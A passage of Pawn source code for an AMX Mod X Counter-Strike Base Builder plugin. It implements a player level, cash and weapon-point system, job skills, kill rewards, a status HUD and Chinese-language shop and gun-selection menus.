public native_get_user_cash(id)     //點數
{
    return g_cash[id]
}

public native_set_user_cash(id, amount)  //點數
{
    g_cash[id] = amount
    return g_cash[id]
}

public native_get_user_level(id)  //等級
{
    return g_level[id]
}

public native_set_user_level(id, amount)  //等級
{
    g_level[id] = amount
    return g_level[id]
}

public native_get_user_xp(id)  //經驗
{
    return g_xp[id]
}

public native_set_user_xp(id, amount)  //經驗
{
    g_xp[id] = amount
    return g_xp[id]
}

public native_get_user_gp(id)  //武器点
{
    return g_gp[id]
}

public native_set_user_gp(id, amount)  //武器点
{
    g_gp[id] = amount
    return g_gp[id]
}

public native_get_user_sp(id)     //點數
{
    return g_sp[id]
}

public native_set_user_sp(id, amount)  //點數
{
    g_sp[id] = amount
    return g_sp[id]
}

public fw_PlayerPreThink(id)
{
    if (g_BattleExp[id] >= ((g_BattleLvl[id] + 1) * 500) && g_BattleLvl[id] < MAXBLEVEL)
	{
    g_BattleLvl[id] ++
	client_printc(id, "\g[等级系统]\y 你的战斗熟练已经升至 \y%d \t等级.", g_BattleLvl[id])
	}
	   
	// 公式：等级 * 2150 + 等级 / 10
    if (g_xp[id] >= ((g_level[id] + 1) * 2150 + floatround(float(g_level[id] + 1) / 10.0)) && g_level[id] < MAXLEVEL)
	{
	g_level[id] ++
    g_cash[id] += 10
    g_sp[id] += 1
	client_printc(id, "\g[等级系统]\y 你已经升至\g[ %d ]\y等级, 并获得\g10\y Cash & \g1\y 技能点作为奖励!", g_level[id])
	}
}

public fw_TakeDamage(victim, inflictor, attacker, Float:damage, damage_type) 
{
    if (attacker == victim  || !is_user_connected(attacker))
		return HAM_IGNORED
	
	if (bb_is_build_phase() || bb_is_prep_phase())
		return HAM_IGNORED
	
    if (cs_get_user_team(victim) == CS_TEAM_T && cs_get_user_team(attacker) == CS_TEAM_CT)
    { 
		if(iPlayerJob[attacker] == JOB_WEAPONER)
		{
			if(iPlayerJobSkill[attacker][SKILL_GUNDMG] > 0)
				damage *= 1.0 + (0.1 * float(iPlayerJobSkill[attacker][SKILL_GUNDMG]))
				
			if(iPlayerJobSkill[attacker][SKILL_FIREBULLET] > 0)
			{
				new iMaxNum = 1000 - SKILL_FIREBULLET
				new iNum = random_num(1, iMaxNum)
				
				if(iNum == random_num(1, iMaxNum))
				{
					z4e_burn_set(victim, 5.0, 0)
					client_printc(attacker, "\g[职业技能] \t<火焰子弹> \y已触发! 被击中僵尸燃烧 \t5\y 秒.")
					client_printc(victim, "\t你被 [枪械大师] 的 <火焰子弹> 击中了! 你将会燃烧 5 秒.")
				}
			}
		}
		else if(iPlayerJob[attacker] == JOB_KILLER)
		{
			if(iPlayerJobSkill[attacker][SKILL_KNIFEDMG] > 0)
			{
				if((get_user_weapon(attacker, _, _) == CSW_KNIFE) && (damage_type & DMG_KNIFE) && damage >= 65.0)
				{
					new Float:NewDamage = (float(iPlayerJobSkill[attacker][SKILL_KNIFEDMG] - 1) * 150.0) + 1000.0
					damage = NewDamage
					client_printc(attacker, "\g[职业技能] \t<锋芒> \y已触发! 对目标造成 \t%d \y点伤害.", floatround(NewDamage))
					client_printc(victim, "\t你被 [刺客] 捅了一刀! 他对你造成了 %d 点伤害.", floatround(NewDamage))
				}
			}
		}
	
		SetHamParamFloat( 4, damage * (1.0 + (Damage_PerLevel * float(g_DamageLevel[attacker])) ) + float(g_BattleLvl[attacker]))
	
		g_damage[attacker] += floatround(damage)
		g_RoundDamage[attacker] += floatround(damage)
    }
	
	new RewardMultiply = 0
	if (g_damage[attacker] >= 4000)
    { 
     g_damage[attacker] -= 4000    // 把 攻擊者的g_damage 變回做 0 
	 RewardMultiply = 4
    } 
    else if (g_damage[attacker] >= 2000)
    { 
     g_damage[attacker] -= 2000    // 把 攻擊者的g_damage 變回做 0 
	 RewardMultiply = 2
    } 
    else if (g_damage[attacker] >= 1000)
    { 
     g_damage[attacker] -= 1000    // 把 攻擊者的g_damage 變回做 0
	 RewardMultiply = 1
    }
	
	if(zp_donater_get_level(attacker) == 10) RewardMultiply *= 3
	else if(zp_donater_get_level(attacker) > 0) RewardMultiply *= 2
	
	if(RewardMultiply > 0)
	{
		g_xp[attacker] += get_pcvar_num(DXP) * RewardMultiply * g_iPlayerBonus
		g_cash[attacker] += get_pcvar_num(DCH) * RewardMultiply * g_iPlayerBonus
		g_BattleExp[attacker] += RewardMultiply
		client_print(attacker, print_center, "EXP + %d  &  Cash + %d", get_pcvar_num(DXP) * RewardMultiply * g_iPlayerBonus, get_pcvar_num(DCH) * RewardMultiply * g_iPlayerBonus)
		
		function(attacker)
	}
	
    return HAM_IGNORED
}

// 寒能积蓄
public Task_Frostgain(id)
{
	if(iPlayerJobSkill[id][SKILL_FROSTGAIN] > 0)
	{
		set_task(70.0 - float(iPlayerJobSkill[id][SKILL_FROSTGAIN]), "Give_Flash" ,id + TASKID_FROSTGAIN)
		ColorChat(id, BLUE, "[被动: 寒能积蓄]发动! 每 %2.1f 秒补给一颗冰冻弹.", 70.0 - float(iPlayerJobSkill[id][SKILL_FROSTGAIN]))
	}
}

public Give_Flash(taskid)
{
	remove_task(taskid)
	new id = taskid - TASKID_FROSTGAIN
	
	new Flash = cs_get_user_bpammo(id, CSW_FLASHBANG)
	new Float:timer = 70.0 - float(iPlayerJobSkill[id][SKILL_FROSTGAIN])
	
	if(Flash < 1)
	{
		if(!Flash)
		{
			give_item (id, "weapon_flashbang")
		}else{
			cs_set_user_bpammo(id, CSW_FLASHBANG, cs_get_user_bpammo(id, CSW_FLASHBANG) + 1)
		}
	}
	set_task(timer,"Give_Flash", taskid)
}
		

public fw_PlayerKilled(victim, attacker, shouldgib) 
{
    if (attacker == victim  || !is_user_connected(attacker))
		return HAM_IGNORED
	
    if(cs_get_user_team(attacker) == CS_TEAM_CT)
    {
    	g_xp[attacker] += get_pcvar_num(CKXP) * g_iPlayerBonus
    	g_cash[attacker] += get_pcvar_num(CKCH) * g_iPlayerBonus
    	client_printc(attacker, "\y[\g击杀奖励\y] 你杀死了一只僵尸! 获得了\g %d \y经验 ,\g %d \yCash !!", get_pcvar_num(CKXP) * g_iPlayerBonus, get_pcvar_num(CKCH) * g_iPlayerBonus)
    }
    else if(cs_get_user_team(attacker) == CS_TEAM_T)
    {
    	g_xp[attacker] += get_pcvar_num(TKXP) * g_iPlayerBonus
    	g_cash[attacker] += get_pcvar_num(TKCH) * g_iPlayerBonus
    	client_printc(attacker, "\y[\g击杀奖励\y] 你感染了一名人类! 获得了\g %d \y经验 ,\g %d \yCash !", get_pcvar_num(TKXP) * g_iPlayerBonus, get_pcvar_num(TKCH) * g_iPlayerBonus)
    }
	
	function(attacker)
	
    return HAM_IGNORED
}

public status_hud(taskid)
{
	new id = taskid - TASK_STATUS_HUD

       new name[33]
	   get_user_name(id, name, 32)
	   
	    if(is_user_alive(id))
	    {
			if(get_user_team(id) == 2)
           {
				set_hudmessage(0, 100, 5, 0.7, 0.65, 0, 0.0, 1.0, 0.1, 0.1, 4)
                ShowSyncHudMsg(id, g_statushud, "[ 玩家: %s ]^n[ 等级: %d | 经验值: %d / %d ]^n[ 技能点: %d | Cash: %d | 武器点: %d ]^n[ 战斗熟练度: %d 级 | %d / %d ]^n[ 职业: %s ]^n[ 回合伤害: %d HP ]", name, g_level[id], g_xp[id] ,((g_level[id] + 1) * 2150 + floatround(float(g_level[id] + 1) / 10.0)), g_sp[id], g_cash[id], g_gp[id], g_BattleLvl[id], g_BattleExp[id], (g_BattleLvl[id] + 1) * 500, szJobName[iPlayerJob[id]], g_RoundDamage[id])
		   }
           else if(get_user_team(id) == 1)
           {
				set_hudmessage(0, 100, 5, 0.7, 0.65, 0, 0.0, 1.0, 0.1, 0.1, 4)
                ShowSyncHudMsg(id, g_statushud, "[ 玩家: %s ]^n[ 等级: %d | 经验值: %d / %d ]^n[ 技能点: %d | Cash: %d | 武器点: %d ]^n[ 战斗熟练度: %d 级 | %d / %d ]", name, g_level[id], g_xp[id] ,((g_level[id] + 1) * 2150 + floatround(float(g_level[id] + 1) / 10.0)), g_sp[id], g_cash[id], g_gp[id], g_BattleLvl[id], g_BattleExp[id], (g_BattleLvl[id] + 1) * 500)
		   }
		   
		   set_task(1.0, "status_hud", id + TASK_STATUS_HUD)
		}
}

public cmdChooseteam(id)
{
		if(g_iSQLInit == 0)
		{
			client_printc(id, "\y[\g基地建设\y] SQL 初始化失败! 请联系管理员处理!")
			return PLUGIN_HANDLED;
		}

		new menu = menu_create("\r基地建设升级 v1.5 Fin.A^n制作：CyberTech Dev Team.", "menu_handler");
				
		menu_additem(menu, "等级系统", "1", 0);
		menu_additem(menu, "道具商城", "2", 0);
		menu_additem(menu, "永久商城^n", "3", 0);
		menu_additem(menu, "装备选择", "4", 0);
		menu_additem(menu, "点数转换", "5", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		
		return PLUGIN_HANDLED;
}

public menu_handler(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
                        level_menu(id)
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
		}
		case 2:
		{
                        shop_menu(id)
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
		}
		case 3:
		{
                        fshop_menu(id)
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
		}
		case 4:
		{
                        my_menu(id)
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
		}
		case 5:
		{
                        exchange_menu(id)
			return PLUGIN_HANDLED;
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public exchange_menu(id)
{
		new menu = menu_create("\r点数转换", "exchange_m");
				
		menu_additem(menu, "10 Cash ---> 1 武器点", "1", 0);
		menu_additem(menu, "100 Cash ---> 10 武器点", "2", 0);
		menu_additem(menu, "1000 Cash ---> 100 武器点^n", "3", 0);
		menu_additem(menu, "1 武器点 ---> 8 Cash", "4", 0);
		menu_additem(menu, "10 武器点 ---> 95 Cash", "5", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		
		return PLUGIN_HANDLED;
}

public exchange_m(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
		if(g_cash[id] >= 10)
			{
			g_gp[id] += 1
			g_cash[id] -= 10
			return PLUGIN_HANDLED;
			}
			else
			{
			client_printc(id, "\g[点数转换] \y你的\t Cash \y不足!!")
			return PLUGIN_HANDLED;
			}
		}
		case 2:
		{
		if(g_cash[id] >= 100)
			{
			g_gp[id] += 10
			g_cash[id] -= 100
			return PLUGIN_HANDLED;
			}
			else
			{
			client_printc(id, "\g[点数转换] \y你的\t Cash \y不足!!")
			return PLUGIN_HANDLED;
			}
		}
		case 3:
		{
		if(g_cash[id] >= 1000)
			{
			g_gp[id] += 100
			g_cash[id] -= 1000
			return PLUGIN_HANDLED;
			}
			else
			{
			client_printc(id, "\g[点数转换] \y你的\t Cash \y不足!!")
			return PLUGIN_HANDLED;
			}
		}
		case 4:
		{
		if(g_gp[id] >= 1)
			{
			g_gp[id] -= 1
			g_cash[id] += 8
			return PLUGIN_HANDLED;
			}
			else
			{
			client_printc(id, "\g[点数转换] \y你的\t 武器点 \y不足!!")
			return PLUGIN_HANDLED;
			}
		}
		case 5:
		{
		if(g_gp[id] >= 10)
			{
			g_gp[id] -= 10
			g_cash[id] += 95
			return PLUGIN_HANDLED;
			}
			else
			{
			client_printc(id, "\g[点数转换] \y你的\t 武器点 \y不足!!")
			return PLUGIN_HANDLED;
			}
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public fshop_menu(id)
{
		new menu = menu_create("\r永久商城", "fshop_handler");
				
		menu_additem(menu, "\y永久枪", "1", 0);
		menu_additem(menu, "\y高玩枪^n", "2", 0);
		menu_additem(menu, "\y副武器^n^n", "3", 0);
		menu_additem(menu, "返回主菜单", "6", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		return PLUGIN_HANDLED;
}

public fshop_handler(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
                        client_cmd(id, "fshopgun")
		}
		case 2:
		{
                        client_cmd(id, "fshophpgun")
		}
		case 3:
		{
                        client_cmd(id, "fshophandgun")
		}
		case 6:
		{
                        cmdChooseteam(id)
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public fwHamPlayerSpawnPost(id)
{
	remove_task(id + TASK_STATUS_HUD)
	set_task(0.5, "status_hud", id + TASK_STATUS_HUD)
 
	if(get_user_team(id) == 2)
	{
		reset_player_speed(id)
		if(g_HealthLevel[id] >= 1)
		{
			add_health(id,g_HealthLevel[id] * Health_PerLevel)
		}
		if(g_GravityLevel[id] >= 1)
		{
			fGravity = g_GravityLevel[id] * Gravity_PerLevel
			set_gravity(id, fGravity)
		}
		if(g_skpH[id] == 0)
		{
			g_skpH[id] = 1
		}
		if(g_skpS[id] == 0)
		{
			g_skpS[id] = 2
		}
		if(g_skpG[id] == 0)
		{
			g_skpG[id] = 15
		}
		if(g_skpD[id] == 0)
		{
			g_skpD[id] = 4
		}
		
		cs_reset_user_model(id)
		strip_user_weapons(id)
		give_item(id, "weapon_knife")
	}
 
	if(iPlayerJob[id] == JOB_KILLER) set_user_rendering(id, kRenderFxNone, kRenderNormal)
	return PLUGIN_HANDLED;
}

public ResetHumanHealth()
{
	for(new i=1;i<33;i++)
	{
		if(!zp_get_user_zombie(i))
		{
			if(g_HealthLevel[i] >= 1)
			{
				set_user_health(i, 100)
				add_health(i,g_HealthLevel[i] * Health_PerLevel)
			}
		}
	}
}

public fw_CmdStart(id, uc_handle, seed) 
{
	if (!is_user_alive(id) || zp_get_user_zombie(id))
		return FMRES_IGNORED;

	static button, oldbutton
	button = get_uc(uc_handle, UC_Buttons)
	oldbutton = pev(id, pev_oldbuttons)
	
	if ((button & IN_RELOAD) && !(oldbutton & IN_RELOAD))
	{
		cmdHumanSkill(id)
	}
	return PLUGIN_HANDLED 
}

public level_menu(id)
{
		new menu = menu_create("\r等级系统", "level_handler");
		
		menu_additem(menu, "\y技能升级", "1", 0);
		menu_additem(menu, "\y手动保存", "2", 0);
		menu_additem(menu, "\y职业系统^n^n", "3", 0);
		menu_additem(menu, "返回主选单", "6", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		return PLUGIN_HANDLED;
}

public level_handler(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
                        skill_menu(id)
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
		}
		case 2:
		{
                        savecmd(id)
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
		}
		case 3:
		{
			if(g_level[id] < 200)
			{
				client_printc(id, "\g[职业系统] \y你的等级不足 \t200 \y级, 无法进入!")
			}
			else if(iPlayerJob[id] == 0 && g_level[id] >= 200)
			{
				job_select_menu(id)
			}
			else if(iPlayerJob[id] > 0)
			{
				job_skill_menu(id)
			}
			return PLUGIN_HANDLED;
		}
		case 6:
		{
                        cmdChooseteam(id)
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public shop_menu(id)
{
		new menu = menu_create("\r点数商城", "shop_handler");
				
		menu_additem(menu, "\y轻功药水 \r         | \w暂时关闭", "1", 0);
		menu_additem(menu, "\y复活 \r(等级200以下) | \w1 武器点", "2", 0);
		menu_additem(menu, "\y高爆破片雷 \r            | \w50 Cash^n^n", "3", 0);
		menu_additem(menu, "返回主目錄", "5", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		return PLUGIN_HANDLED;
}

public shop_handler(id, menu, item)
{
	if(get_user_team(id) == 1) return PLUGIN_HANDLED;

	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
	  		if(g_gp[id] >= 99999)
			{
			 client_printc(id, "\g[点数商城]\t己成功購買了\y低重力藥水\g!!")
			 g_gp[id] -=2
			 set_user_gravity(id, 0.7)
			} 
			else
			{
			 client_printc(id, "\g[点数商城]\t你沒有足夠的 \y武器点\g!!")
			 //menu_destroy(menu);
			 return PLUGIN_HANDLED
			} 
		}
		case 2:
		{
			if(is_user_alive(id)) 
			{ 
			 client_printc(id, "\g[點數商城]\t你還活著,不能購買\y復活\t!!")
			 return PLUGIN_HANDLED 
			}
	  		if(g_gp[id] < 1)
			{
			 client_printc(id, "\g[點數商城]\t你沒有足夠的\y武器點\t!!")
			 return PLUGIN_HANDLED 
			} 
	  		if(g_level[id] > 200)
			{
			 client_printc(id, "\g[點數商城]\t你的等級己大於\y200\t等!!")
			 return PLUGIN_HANDLED 
			} 
			if(cs_get_user_deaths(id)) 
			{ 
	    		 g_gp[id] -=1
			 client_printc(id, "\g[點數商城]\t你己成功購買了\y復活\t!!")
			 ExecuteHam(Ham_CS_RoundRespawn,id); 
                         spawn(id) 
			 //menu_destroy(menu);
			} 
		}
		case 3:
		{
	  		if(g_cash[id] >= 50)
			{
			 client_printc(id, "\g[點數商城]\t己成功購買了\y高爆破片雷\t!!")
			 g_cash[id] -= 50
			give_item(id, "weapon_hegrenade")
			} 
			else
			{
			 client_printc(id, "\g[點數商城]\y你沒有足夠的\t Cash \y!!")
			 //menu_destroy(menu);
			 return PLUGIN_HANDLED
			} 
		}
		case 5:
		{
                        cmdChooseteam(id)
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public my_menu(id)
{
		new menu = menu_create("\r装备选择", "my_handler");
				
		menu_additem(menu, "\y装备主武器", "1", 0);
		menu_additem(menu, "\y装备高玩枪", "2", 0);
		menu_additem(menu, "\y装备副武器", "3", 0);
		menu_additem(menu, "\y装备特殊物品", "4", 0);
		menu_additem(menu, "\w||新手指南||^n", "5", 0);
		menu_additem(menu, "返回主選單", "6", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		return PLUGIN_HANDLED;
}

public my_handler(id, menu, item)
{
	if(get_user_team(id) == 1) return PLUGIN_HANDLED;

	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
                        client_cmd(id, "myfgmenu")
		}
		case 2:
		{
                        client_cmd(id, "myfhpgmenu")
		}
		case 3:
		{
                        client_cmd(id, "myfhgmenu")
		}
		case 4:
		{
                        client_cmd(id, "myfomenu")
		}
		case 5:
		{
                        display_help_info(id)
		}
		case 6:
		{
                        cmdChooseteam(id)
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public display_help_info(id)
{
	new motd_text[2048], title_text[64], maxlen, len
	maxlen = charsmax(motd_text)
	len = 0
	
	format(title_text, charsmax(title_text), "* %s Ver:%s *", PLUGIN, VERSION)
	
	len += format(motd_text[len], maxlen-len, "<html><head><meta charset=UTF-8><style type=^"text/css^">pre{color:#FFB000;}body{background:#000000;margin-left:8px;margin-top:0px;}</style></head><pre><body>")
	len += format(motd_text[len], maxlen-len, "^n^n<b>新手指南-幫助</b>^n")
	len += format(motd_text[len], maxlen-len, "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^n")
	len += format(motd_text[len], maxlen-len, "!!!感謝使用本插件!!!^n^n")
	len += format(motd_text[len], maxlen-len, "本插件为 [FAITH]社区 基地建设专用升级^n")
	len += format(motd_text[len], maxlen-len, "||等級系統|等級槍|永久物品|商城|技能升級|| 持續更新!!^n^n")
	len += format(motd_text[len], maxlen-len, "永久物品一直有更新~玩家可到永久商城查閱,這些裝備一但購買後都能永久保存!相對價錢也會比較貴!^n")
	len += format(motd_text[len], maxlen-len, "回合開始會顯示選槍選單，玩家可選擇裝備等級槍或永久槍械 & 物品^n")
	len += format(motd_text[len], maxlen-len, "指令如下:^n")
	len += format(motd_text[len], maxlen-len, "/help         :開啟指南^n")
	len += format(motd_text[len], maxlen-len, "/bb_lvl       :開啟主選單(或按M)^n")
	len += format(motd_text[len], maxlen-len, "/save         :儲存紀錄(也設有自動每秒存檔)^n^n")
	len += format(motd_text[len], maxlen-len, "-----------------------------------------------^n")
	len += format(motd_text[len], maxlen-len, "特別道具介紹: ^n")
	len += format(motd_text[len], maxlen-len, "震盪手雷 :能使喪屍 暈眩 , 減慢速度 !!但是太靠近自己也會受到影響 ^n")
	len += format(motd_text[len], maxlen-len, "破片高爆雷 :炸飛 喪屍並且附帶 燃燒 效果.^n")
	len += format(motd_text[len], maxlen-len, "-----------------------------------------------^n")
	len += format(motd_text[len], maxlen-len, "如有任如問題.Bug.建議 等等 請聯絡本人 (￣Д￣)ﾉ!^n")
	len += format(motd_text[len], maxlen-len, "作者信息:^n")
	len += format(motd_text[len], maxlen-len, "原作者:xD0625^n")
	len += format(motd_text[len], maxlen-len, "修改:EmeraldGhost^n")
	len += format(motd_text[len], maxlen-len, "http://steamcommunity.com/id/emeraldghost^n^n")
	format(motd_text[len], maxlen-len, "</body></pre></html>")
	
	show_motd(id, motd_text, title_text)
	
	return PLUGIN_HANDLED;
}

public levelgun_menu(id)
{
		if(get_user_team(id) == 1)
		{
			client_printc(id, "\g[等級系統] \t喪屍不能使用槍!!")
			return PLUGIN_HANDLED
		}

		new menu = menu_create("\r等級槍選單", "gun_handler");
				
		menu_additem(menu, "\w等級\r 0 \y | 衝鋒槍Tmp", "1", 0);
		menu_additem(menu, "\w等級\r 5 \y | 衝鋒槍Mp5", "2", 0);
		menu_additem(menu, "\w等級\r10 \y| 衝鋒槍P90", "3", 0);
		menu_additem(menu, "\w等級\r15 \y| 連散Xm1014", "4", 0);
		menu_additem(menu, "\w等級\r20 \y| 步槍Galil", "5", 0);
		menu_additem(menu, "\w等級\r25 \y| 步槍Ak47", "6", 0);
		menu_additem(menu, "\w等級\r30 \y| 步槍M4A1", "7", 0);
		menu_additem(menu, "\w等級\r40 \y| 重狙Awp", "8", 0);
		menu_additem(menu, "\w等級\r50 \y| 連狙SG550", "9", 0);
		menu_additem(menu, "\r等級\y60 \r| 衝鋒之王套裝", "10", 0);
		menu_additem(menu, "\r等級\y70 \r| 散彈之王套裝", "11", 0);
		menu_additem(menu, "\r等級\y80 \r| 狙擊之王套裝", "12", 0);
		menu_additem(menu, "\r等級\y90 \r| 步槍之王套裝", "13", 0);
		menu_additem(menu, "\r等級\y100 \r| 連狙G3SG1", "14", 0);
		menu_additem(menu, "\r等級\y110 \r| 機槍M249", "15", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		return PLUGIN_HANDLED;
}

public gun_handler(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
	  		if(g_level[id] >= 0)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 衝鋒槍Tmp 套裝。");
			give_item(id, "weapon_tmp");
			cs_set_user_bpammo(id,CSW_TMP,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
		}
		case 2:
		{
	  		if(g_level[id] >= 5)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 衝鋒槍Mp5 套裝。");
			give_item(id, "weapon_mp5navy");
			cs_set_user_bpammo(id,CSW_MP5NAVY,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 3:
		{
	  		if(g_level[id] >= 10)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 衝鋒槍P90 套裝。");
			give_item(id, "weapon_p90");
			cs_set_user_bpammo(id,CSW_P90,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 4:
		{
	  		if(g_level[id] >= 15)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 散彈XM1014 套裝。");
			give_item(id, "weapon_xm1014");
			cs_set_user_bpammo(id,CSW_XM1014,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 5:
		{
	  		if(g_level[id] >= 20)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 步槍Galil 套裝。");
			give_item(id, "weapon_galil");
			cs_set_user_bpammo(id,CSW_GALIL,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 6:
		{
	  		if(g_level[id] >= 25)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 步槍Ak47 套裝。");
			give_item(id, "weapon_ak47");
			cs_set_user_bpammo(id,CSW_AK47,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 7:
		{
	  		if(g_level[id] >= 30)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 步槍M4a1 套裝。");
			give_item(id, "weapon_m4a1");
			cs_set_user_bpammo(id,CSW_M4A1,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
